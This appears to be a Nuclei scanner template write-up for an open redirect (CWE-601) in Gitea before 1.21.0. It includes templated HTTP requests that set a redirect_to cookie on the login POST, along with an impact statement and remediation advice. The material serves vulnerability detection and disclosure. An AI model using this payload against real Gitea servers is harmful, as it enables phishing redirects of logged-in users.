# Nuclei Template: Gitea < 1.21.0 - Open Redirect
**Template ID:** gitea-open-redirect-bypass
**Vulnerability Class:** Open Redirect
**Severity:** Medium
**CWE:** CWE-601
**Source:** Nuclei Template (`gitea-open-redirect-bypass.yaml`)

## Vulnerability Information & PoC

## Description
Gitea before version 1.21.0 is affected by URL Redirection to Untrusted Site ('Open Redirect') via internal URLs. The vulnerability exists in the redirect_to parameter used on the login page (/user/login). Due to improper validation of the redirect URL, an attacker can craft a malicious link that redirects authenticated users to an arbitrary external website after login.

## Impact
An attacker can exploit this vulnerability to redirect users to malicious websites, leading to phishing attacks or the theft of sensitive information.

## Steps to reproduce / Exploit Payload
```http
GET /user/login HTTP/1.1
Host: {{Hostname}}

POST /user/login HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded
Cookie: redirect_to={{redirect}}

_csrf={{csrf}}&user_name={{username}}&password={{url_encode(password)}}
```

## Remediation
Upgrade Gitea to version 1.21.0 or later to fix the open redirect vulnerability.

## References
- https://github.com/go-gitea/gitea/issues/36660
